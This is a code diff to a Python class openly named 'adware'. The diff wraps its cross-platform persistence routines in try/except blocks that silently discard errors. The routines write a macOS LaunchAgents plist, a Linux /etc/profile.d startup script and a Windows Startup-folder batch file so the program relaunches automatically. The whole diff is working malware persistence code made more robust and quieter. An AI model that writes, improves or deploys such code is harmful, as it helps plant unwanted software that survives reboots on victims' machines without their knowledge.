@@ -35,26 +35,35 @@ class adware:
         time.sleep(time)
 
     def persistenceMac(self):
-        #make plist
-        plist = open("/Library/LaunchAgents/startup.plist", 'w')
-        #write to plist
-        plist.write("<key>Run</key>\n<array>\n\t<string>" + self.pyCall + "</string>\n\t<string>" + os.getcwd() + "</string>\n</array>")
-        plist.close()
+        try:
+            #make plist
+            plist = open("/Library/LaunchAgents/startup.plist", 'w')
+            #write to plist
+            plist.write("<key>Run</key>\n<array>\n\t<string>" + self.pyCall + "</string>\n\t<string>" + os.getcwd() + "</string>\n</array>")
+            plist.close()
+        except:
+            pass
 
     def persistenceLinux(self):
-        #make sh
-        sh = open("/etc/profile.d/startup.sh", 'w')
-        #write to plist
-        sh.write(self.pyCall + ' ' + os.getcwd())
-        sh.close();
-        #make executable
-        os.system("chmod +x " + os.getcwd())
+        try:
+            #make sh
+            sh = open("/etc/profile.d/startup.sh", 'w')
+            #write to plist
+            sh.write(self.pyCall + ' ' + os.getcwd())
+            sh.close();
+            #make executable
+            os.system("chmod +x " + os.getcwd())
+        except:
+            pass
 
     def persistenceWindows(self):
-        #make bat
-        bat = open(os.path.expandvars("%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/startup.bat"), 'w+')
-        #write to plist
-        bat.write(self.pyCall + ' \"' + __file__ + "\"")
-        bat.close();
+        try:
+            #make bat
+            bat = open(os.path.expandvars("%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/startup.bat"), 'w+')
+            #write to plist
+            bat.write(self.pyCall + ' \"' + __file__ + "\"")
+            bat.close();
+        except:
+            pass
 
 ads = adware()
